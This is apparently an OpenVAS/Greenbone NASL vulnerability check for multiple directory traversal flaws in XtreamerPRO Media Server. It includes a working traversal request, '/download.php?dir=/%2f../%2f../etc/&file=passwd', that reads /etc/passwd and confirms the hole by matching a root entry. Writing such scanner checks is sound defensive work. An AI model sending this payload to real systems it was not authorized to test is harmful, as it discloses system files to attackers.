if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.900286" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "XtreamerPRO Media Server 'dir' Parameter Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17290/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101476" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "XtreamerPRO Version 2.6.0, 2.7.0, Other versions may also be
  affected." );
	script_tag( name: "insight", value: "The flaws are due to input validation error in 'dir' parameter
  to 'download.php' and 'otherlist.php', which allows attackers to read arbitrary files via a /%2f.. sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running XtreamerPRO Media Server and is prone to
  multiple directory traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
res = http_get_cache( item: "/login_form.php", port: port );
if(IsMatchRegexp( res, ">Copyright .*[0-9]{4} Xtreamer.net" )){
	path = "/download.php?dir=/%2f../%2f../etc/&file=passwd";
	req = http_get( item: path, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: ".*root:.*:0:[01]:.*", string: res )){
		security_message( port );
	}
}

